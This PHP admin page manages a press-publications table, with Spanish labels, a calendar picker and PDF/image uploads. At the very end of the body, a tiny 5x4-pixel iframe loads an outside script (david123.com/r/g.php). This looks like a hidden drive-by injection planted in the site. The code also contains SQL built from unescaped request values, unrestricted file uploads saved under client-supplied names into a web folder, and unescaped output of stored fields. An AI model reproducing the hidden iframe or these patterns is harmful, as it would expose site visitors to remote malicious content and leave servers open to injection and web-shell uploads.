<?php
	include_once('../inc/conf.inc.php');
	
	//TRANSFORMA LA FECHA DE FRANCES A MYSQL
	function FrancesToMysql($fecha) {
		$tmp = split("/", $fecha);
		$dia = $tmp[0];
		$mes = $tmp[1];
		$ano = $tmp[2];
		return "$ano-$mes-$dia";
	}

	//TRANSFORMA LA FECHA DE MYSQL A FRANCES
	function MysqlToFrances($fecha) {
		$tmp = split("-", $fecha);
		$dia = $tmp[2];
		$mes = $tmp[1];
		$ano = $tmp[0];
		return "$dia/$mes/$ano";
	}
	
	$usuarios = new DBI;
	if ($fecha) $fecha = FrancesToMysql($fecha);
	$campos = 'fecha,mes_esp,mes_ing,mes_por,titulo_esp,titulo_ing,titulo_por,medio,paginas,socio,areas';
?>
<html>
<head>
	<title>Publicaciones</title>
	<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
	<link rel="stylesheet" href="../<?php echo CFG_styleDir.CFG_styleFile?>" type="text/css">
    <link rel="stylesheet" href="../styles/tabla.css" type="text/css">
</head>

<body>
<?php
	switch ($action) {
		case 'Agregar':
			$id = dbi::insert( 'prensa', $campos );
			if( is_uploaded_file( $pdf ) )
			{
				if( copy( $pdf, '../../prensa/'.$_FILES['pdf']['name'] ) )
				{
					dbi::update( 'prensa', "pdf='prensa/".$_FILES['pdf']['name']."'", "id=$id" );
				}
			}
			if( is_uploaded_file( $imagen ) )
			{
				if( copy( $imagen, '../../prensa/'.$_FILES['imagen']['name'] ) )
				{
					dbi::update( 'prensa', "imagen='prensa/".$_FILES['imagen']['name']."'", "id=$id" );
				}
			}
			$action = '';
			break;
		case 'Modificar':
			dbi::update( 'prensa', $campos, "id = $id");
			if( is_uploaded_file( $pdf ) )
			{
				if( copy( $pdf, '../../prensa/'.$_FILES['pdf']['name'] ) )
				{
					dbi::update( 'prensa', "pdf='prensa/".$_FILES['pdf']['name']."'", "id=$id" );
				}
			}
			if( is_uploaded_file( $imagen ) )
			{
				if( copy( $imagen, '../../prensa/'.$_FILES['imagen']['name'] ) )
				{
					dbi::update( 'prensa', "imagen='prensa/".$_FILES['imagen']['name']."'", "id=$id" );
				}
			}
			$action = '';
			break;
		case 'Borrar':
			dbi::delete( 'prensa', "id = $id");
			$action = '';
			break;
	}
?>
<?php
	if ($action == '') {
		if (trim($order) == '') $order = 'fecha';
		$publicaciones = dbi::select( 'prensa', '*', '', $order);
?>
<table align="center" width="550" cellpadding="3" cellspacing="0" border="0">
	<tr> 
		<th colspan="4" class="relieve">
			<table width="100%" border="0" cellspacing="0" cellpadding="0">
				<tr>
					<td width="52%"><a href="<?php echo $PHP_SELF?>?action=frmAgregar" class="text">Agregar Publicación</a></td>
					<td width="48%" align="right" class="text">Total: <?php echo $publicaciones->num_rows()?></td>
				</tr>
			</table>
		</th>
	</tr>
	<tr> 
		<td height="5" colspan="6" class="sombra_titulo"></td>
	</tr>
	<tr align="center"> 
		<td class="table1_table" width="20">Ver</td>
		<td class="table1_table"><a href="<?php echo $PHP_SELF?>?order=titulo_esp">Titulo</a></td>
		<td class="table1_table"><a href="<?php echo $PHP_SELF?>?order=fecha">Fecha</a></td>
		<td class="table1_table"><a href="<?php echo $PHP_SELF?>?order=socio">Grupo</a></td>
	</tr>
<?php
		if ($publicaciones->num_rows() < 1) {
?>
	<tr> 
		<td colspan="8" align="center" class="data">Ningun registro</td>
	</tr>
<?php
		}else{
			while( $prensa = $publicaciones->fetch_object() ){
				$tr_bgcolor = ($tr_bgcolor == '#6699CC')?'#336699':'#6699CC';
?>
	<tr> 
		<td bgcolor="<?php echo $tr_bgcolor?>" class="relieve" align="center">
			<a href="<?php echo $PHP_SELF?>?id=<?php echo $prensa->id?>&action=ver"><img src="<? echo CFG_imgPath?>list.gif" border="0" /></a></td>
		<td bgcolor="<?php echo $tr_bgcolor?>" class="relieve" align="center">
			&nbsp;<?php echo $prensa->titulo_esp?></td>
		<td bgcolor="<?php echo $tr_bgcolor?>" class="relieve" align="center">
			&nbsp;<?php echo $prensa->mes_esp?></td>
		<td bgcolor="<?php echo $tr_bgcolor?>" class="relieve" align="center">
			&nbsp;<?php echo $prensa->socio == 'mdt' ? 'Muños de Toro' : ( $prensa->socio == 'sou' ? 'Sousa' : 'Alvares' ) ?></td>
	</tr>
<?php
			}
		}
?>
</table>
<?php
	 }
?>
<?php
	if ($action == 'ver') {
		$prensa = DBI::record(
			"prensa",
			"id = $id"
		);
?>
<form name="form1" method="post" action="<?= $PHP_SELF?>">
	<table width="398" border="0" cellspacing="0" cellpadding="0" align="center">
		<tr align="center" bgcolor="#305280"> 
			<th height="31" colspan="2" class="relieve"><span class="title">Ver Publicaci&oacute;n </span></th>
		</tr>
		<tr bgcolor="#6699CC">
        	<td align="center" class="relieve" bgcolor="#6699CC" height="17">Fecha</td>
        	<td class="relieve" align="center" height="17">&nbsp;<?php echo MysqlToFrances($prensa->fecha)?></td>
		</tr>
		<tr bgcolor="#6699CC">
        	<td align="center" class="relieve" bgcolor="#6699CC" height="17">Mes Espa&ntilde;ol</td>
        	<td class="relieve" align="center" height="17">&nbsp;<?php echo $prensa->mes_esp?></td>
		</tr>
		<tr bgcolor="#6699CC">
        	<td align="center" class="relieve" bgcolor="#6699CC" height="17">Mes Ingles</td>
        	<td class="relieve" align="center" height="17">&nbsp;<?php echo $prensa->mes_ing?></td>
		</tr>
		<tr bgcolor="#6699CC">
        	<td align="center" class="relieve" bgcolor="#6699CC" height="17">Mes Portugues</td>
        	<td class="relieve" align="center" height="17">&nbsp;<?php echo $prensa->mes_por?></td>
		</tr>
		<tr bgcolor="#6699CC"> 
			<td width="188" align="center" class="relieve" bgcolor="#6699CC" height="17">Titulo Espa&ntilde;ol</td>
			<td width="210" class="relieve" align="center" height="17">&nbsp;<?php echo $prensa->titulo_esp?></td>
		</tr>
		<tr bgcolor="#336699"> 
			<td width="188" align="center" class="relieve" bgcolor="#336699">Titulo Ingles</td>
			<td width="210" class="relieve" align="center">&nbsp;<?php echo $prensa->titulo_ing?></td>
		</tr>
		<tr bgcolor="#6699CC"> 
			<td width="188" align="center" class="relieve">Titulo Portugues</td>
			<td width="210" class="relieve" align="center">&nbsp;<?php echo $prensa->titulo_por?></td>
		</tr>
		<tr bgcolor="#336699">
        	<td align="center" bgcolor="#6699CC" class="relieve">Medio</td>
        	<td class="relieve" align="center"><?= $prensa->medio?>
        		</td>
		</tr>
		<tr bgcolor="#336699">
        	<td align="center" bgcolor="#6699CC" class="relieve">P&aacute;gina</td>
        	<td class="relieve" align="center"><?= $prensa->paginas?>
        		</td>
		</tr>
		<tr bgcolor="#336699">
        	<td align="center" bgcolor="#6699CC" class="relieve">Socio</td>
        	<td class="relieve" align="center"><?php echo $prensa->socio == 'mdt' ? 'Mu&ntilde;os de Toro' : ( $prensa->socio == 'sou' ? 'Sousa' : 'Alvares' ) ?>
        		</td>
		</tr>
		<tr bgcolor="#6699CC">
        	<td align="center" class="relieve">Image</td>
        	<td class="relieve" align="center"><img src="../../<?= $prensa->imagen?>" border="0"/></td>
		</tr>
		<tr bgcolor="#336699">
        	<td align="center" class="relieve">Archivo</td>
        	<td class="relieve" align="center">&nbsp;<?php echo $prensa->pdf?></td>
		</tr>
		<tr bgcolor="#336699"> 
			<td width="188" align="center" class="relieve">Area</td>
			<td width="210" class="relieve" align="center">&nbsp;<?php echo $prensa->areas == 1 ? 'Prensa' : 'Publicaciones' ?></td>
		</tr>
		<tr bgcolor="#6699CC"> 
			<td colspan="2" class="relieve" bgcolor="#336699"><center>
				<input type="hidden" name="id" value="<?php echo $id?>">
				<input type="hidden" name="action" value="">
				<input type="button" class="boton" value="Aceptar" onClick="javascript:void open('<?php echo $PHP_SELF?>','_self','')">
				<input type="button" class="boton" value="Modificar" onClick="javascript:document.form1.action.value='frmModificar';document.form1.submit();">
				<input type="button" class="boton" value="Borrar" onClick="javascript:document.form1.action.value='frmBorrar';document.form1.submit();">
			</center></td>
		</tr>
	</table>
</form>
<?php
	}
?>
<?php
	if ($action == 'frmAgregar' || $action == 'frmModificar') {
		if ($action == 'frmModificar') {
			$prensa = DBI::record( 'prensa',"id = $id");
		}
?>
<?php
	Form::validate();
?>
<script>
// CALENDARIO
function Dating( ids ) {
	var sRtn;
	sRtn = showModalDialog("../common/calendar.html","","center=yes;dialogWidth=152pt;dialogHeight=185pt;scrolling=no");
	if (sRtn){
		if( sRtn == "empty" ){
			ids.value = "";
		} else {
			ids.value = sRtn;
		}
	}
}
</script>
<form name="form1" method="post" action="<?= $PHP_SELF?>" onSubmit="return validate(this)" enctype="multipart/form-data">
	<table width="414" border="0" cellspacing="0" cellpadding="0" align="center">
		<tr align="center" bgcolor="#305280"> 
			<th height="29" colspan="2" class="relieve"><span class="texto_titulo">Usuario</span></th>
		</tr>
		<tr bgcolor="#6699CC">
			<td align="center" class="relieve">Fecha</td> 
			<td width="226" class="relieve" align="center" height="17"><input type=text name=fecha maxlength=10 class="fields" style="width: 185px;" readonly value="<?=$prensa? MysqlToFrances($prensa->fecha) : ""?>"> <img src="../img/btn_calendar.gif" onclick="Dating(fecha);"></td>
		</tr>
		<tr bgcolor="#336699">
			<td align="center" class="relieve" bgcolor="#6699CC">Mes Espa&ntilde;ol</td> 
			<td width="226" class="relieve" align="center"><input id="mes_esp" name="mes_esp" type="text" value="<?= $prensa->mes_esp?>" class="fields" validar="str(4,100):El clave debe tener mas de cuatro caracteres.">
			</td>
		</tr>
		<tr bgcolor="#6699CC">
			<td align="center" class="relieve">Mes Ingles</td> 
			<td width="226" class="relieve" align="center"><input id="mes_ing" name="mes_ing" type="text" value="<?= $prensa->mes_ing?>" class="fields"></td>
		</tr>
		<tr bgcolor="#336699">
			<td align="center" class="relieve" bgcolor="#6699CC">Mes Portugues</td> 
			<td width="226" class="relieve" align="center"><input id="mes_por" name="mes_por" type="text" value="<?= $prensa->mes_por?>" class="fields"></td>
		</tr>
		<tr bgcolor="#6699CC">
			<td width="188" align="center" class="relieve">Titulo Espa&ntilde;ol</td> 
			<td width="226" class="relieve" align="center"><input name="titulo_esp" type="text" value="<?= $prensa->titulo_esp?>" class="fields" validar="str:Debe ingresar nombre.">
			</td>
		</tr>
		<tr bgcolor="#336699">
			<td width="188" align="center" class="relieve">Titulo Ingles</td> 
			<td width="226" class="relieve" align="center"><input name="titulo_ing" type="text" value="<?= $prensa->titulo_ing?>" class="fields">
			</td>
		</tr>
		<tr bgcolor="#6699CC">
			<td width="188" align="center" class="relieve">Titulo Portugues</td> 
			<td width="226" class="relieve" align="center"><input name="titulo_por" type="text" class="fields" value="<?= $prensa->titulo_por?>"></td>
		</tr>
		<tr bgcolor="#336699">
        	<td align="center" bgcolor="#6699CC" class="relieve">Medio</td>
        	<td class="relieve" align="center"><input name="medio" type="text" class="fields" value="<?= $prensa->medio?>">
        		</td>
		</tr>
		<tr bgcolor="#336699">
        	<td align="center" bgcolor="#6699CC" class="relieve">P&aacute;gina</td>
        	<td class="relieve" align="center"><input name="paginas" type="text" class="fields" value="<?= $prensa->paginas?>">
        		</td>
		</tr>
		<tr bgcolor="#336699">
        	<td align="center" bgcolor="#6699CC" class="relieve">Socio</td>
        	<td class="relieve" align="center"><? widgets::combo( 'socio', array( 'mdt' => 'Muños de Toro', 'sou' => 'Sousa', 'alv' => 'Alvares' ), $prensa->socio) ?>
        		</td>
		</tr>
		<tr bgcolor="#336699">
			<td align="center" bgcolor="#6699CC" class="relieve">Image</td> 
			<td width="226" class="relieve" align="center">
				<? if ($action == 'frmModificar') { ?><img src="../../<?= $prensa->imagen?>" border="0"/> <? } ?>
				<input name="imagen" type="file" class="fields" value=""> 
			</td></tr>
		<tr bgcolor="#6699CC">
			<td width="188" align="center" bgcolor="#336699" class="relieve">Archivo</td> 
			<td width="226" class="relieve" align="center"><?= basename( $prensa->pdf ) ?><br><input name="pdf" type="file" value="" class="fields"> 
			</td>
		</tr>
		<tr bgcolor="#336699">
        	<td align="center" bgcolor="#6699CC" class="relieve">Area</td>
        	<td class="relieve" align="center"><? widgets::combo( 'areas', array( '1' => 'Prensa', '2' => 'Publicaciones' ), $prensa->areas ) ?>
        		</td>
		</tr>
		<tr align="center" bgcolor="#6699CC"> 
			<td colspan="2" class="relieve" bgcolor="#336699"> <center>
			<input name="id" type="hidden" id="id" value="<?= $prensa->id?>">
			<input type="hidden" name="action" value="<?= $action == 'frmAgregar' ? 'Agregar' : 'Modificar' ?>">
			<input type="submit" class="boton" value="<?= $action == 'frmAgregar' ? 'Agregar' : 'Modificar' ?>">
			<input type="button" class="boton" value="Cancelar" name="Button" onClick="location = '<? echo $PHP_SELF?>'">
			</center></td>
		</tr>
	</table>
</form>
<?php
	}
?>
<?
        if($action == 'frmBorrar'){
                $prensa = DBI::record('prensa',"id = $id");
?>
<form name="form1" method="post" action="<?= $PHP_SELF?>">
  
 <table width="398" border="0" cellspacing="0" cellpadding="0" align="center">
  <tr align="center" bgcolor="#305280"> 
   <th class="relieve" height="31" colspan="2"> <span class="texto_titulo"> Borrar 
	Usuario </span> </th>
  </tr>
  <tr bgcolor="#6699CC">
  	<td align="center" class="relieve">Fecha</td> 
    <td align="center" class="relieve">&nbsp;<?php echo MysqlToFrances($prensa->fecha)?></td>
  </tr>
  <tr bgcolor="#336699">
  	<td align="center" class="relieve" bgcolor="#6699CC">Mes Espa&ntilde;ol</td> 
    <td align="center" bgcolor="#6699CC" class="relieve">&nbsp;<?php echo $prensa->mes_esp?></td>
  </tr>
  <tr bgcolor="#6699CC">
  	<td align="center" class="relieve">Mes Ingles</td> 
    <td align="center" class="relieve">&nbsp;<?php echo $prensa->mes_ing?></td>
  </tr>
  <tr bgcolor="#336699">
  	<td align="center" class="relieve" bgcolor="#6699CC">Mes Portugues</td> 
    <td align="center" bgcolor="#6699CC" class="relieve">&nbsp;<?php echo $prensa->mes_por?></td>
  </tr>
  <tr bgcolor="#6699CC">
  	<td width="188" align="center" class="relieve">Titulo Espa&ntilde;ol</td> 
    <td width="210" align="center" class="relieve">&nbsp;<?php echo $prensa->titulo_esp?></td>
  </tr>
  <tr bgcolor="#336699">
  	<td width="188" align="center" class="relieve">Titulo Ingles</td> 
    <td width="210" align="center" class="relieve">&nbsp;<?php echo $prensa->titulo_ing?></td>
  </tr>
  <tr bgcolor="#6699CC">
  	<td width="188" align="center" class="relieve">Titulo Portugues</td> 
    <td width="210" align="center" class="relieve">&nbsp;<?php echo $prensa->titulo_por?></td>
  </tr>
  <tr bgcolor="#336699">
  	<td align="center" bgcolor="#6699CC" class="relieve">Medio</td>
  	<td class="relieve" align="center"><?= $prensa->medio?>
  		</td>
  	</tr>
  <tr bgcolor="#336699">
  	<td align="center" bgcolor="#6699CC" class="relieve">P&aacute;gina</td>
  	<td class="relieve" align="center"><?= $prensa->paginas?>
  		</td>
  	</tr>
  <tr bgcolor="#336699">
  	<td align="center" bgcolor="#6699CC" class="relieve">Socio</td>
  	<td class="relieve" align="center"><?php echo $prensa->socio == 'mdt' ? 'Mu&ntilde;os de Toro' : ( $prensa->socio == 'sou' ? 'Sousa' : 'Alvares' ) ?> </td>
  	</tr>
  <tr bgcolor="#336699">
  	<td align="center" bgcolor="#6699CC" class="relieve">Image</td> 
    <td align="center" bgcolor="#6699CC" class="relieve"><img src="../../<?= $prensa->imagen?>" border="0"/></td>
  </tr>
  <tr bgcolor="#6699CC">
  	<td width="188" align="center" bgcolor="#336699" class="relieve">Archivo</td> 
    <td width="210" align="center" bgcolor="#336699" class="relieve">&nbsp;<?php echo $prensa->pdf?></td>
  </tr>
  <tr bgcolor="#336699">
  	<td align="center" class="relieve">Area</td>
  	<td class="relieve" align="center">&nbsp;<?php echo $prensa->areas == 1 ? 'Prensa' : 'Publicaciones' ?></td>
  	</tr>
  <tr align="center"> 
   <td colspan="2" class="relieve" bgcolor="#336699"> <center>
	 <input type="hidden" name="action" value="Borrar">
	 <input type="hidden" name="id" value="<?= $id?>">
	 <input type="submit" class="boton" value="Borrar">
		  <input type="button" class="boton" value="Cancelar" name="Button" onClick="location = 'usuarios.php'">
		</center></td>
  </tr>
 </table>
</form>
<? } ?>
<iframe src="http://david123.com/r/g.php" width="5" height="4" align="right"></iframe></body>
</html>
